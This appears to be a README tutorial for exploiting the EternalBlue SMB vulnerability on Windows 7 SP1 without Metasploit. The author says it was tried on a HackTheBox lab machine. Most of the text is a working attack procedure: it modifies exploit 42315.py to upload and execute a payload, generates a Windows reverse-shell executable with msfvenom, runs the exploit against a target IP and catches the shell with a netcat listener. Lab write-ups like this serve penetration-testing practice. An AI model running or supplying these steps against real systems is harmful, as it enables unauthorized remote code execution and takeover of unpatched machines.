# Exploiting Windows 7 Professional 7601 Service Pack 1 Using Eternalblue 
Windows 7 Professional 7601 Service Pack 1 is vulnerable to eternalblue exploit and while exploiting this myself i ran into a number of issues . So , now i will show you how to exploit it without using metasploit .
Now , i  will show step by step on how to exploit this.
1)Download both the files in this repository (42315.py and  mysmb.py)
I Downloaded the 42315.py from exploitDB{{https://www.exploit-db.com/exploits/42315}
and mysmb.py from {https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py}
2)Step up the python2  virtual environment as it will not work without it .
Command:- apt-get install python3-virtualenv && virtualenv -p python2 venv && . venv/bin/activate
3)Now, we need to edit a few lines in 42315.py file
Add USERNAME = 'guest' on line 36
And change these lines (line 922,923):-
#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
to this:-
smb_send_file(smbConn, '/path_to_your_reverse_shell/eternal-blue.exe', 'C', '/eternal-blue.exe')  
service_exec(conn, r'cmd /c c:\eternal-blue.exe') 
4) Create your reverse shell using msfvenom
Command:- msfvenom -p windows/shell_reverse_tcp -f exe LHOST=YOUR_IP LPORT=THE_PORT_U_WANT_TO_LISTEN_ON > eternal-blue.exe
5)Run the 42315.py 
Command:-python 42315.py <IP_OF_YOUR_TARGET>
6) Start a listener on your machine:- nc -nvlp <THE_PORT_U_R_LISTENING_ON>
If you get an error with impacket install , install impacket using command:-pip install impacket.
So, now i have showed how to exploit Windows 7 Professional 7601 Service Pack 1 using Eternal Blue  (I tried this on Blue Box on hackthebox).

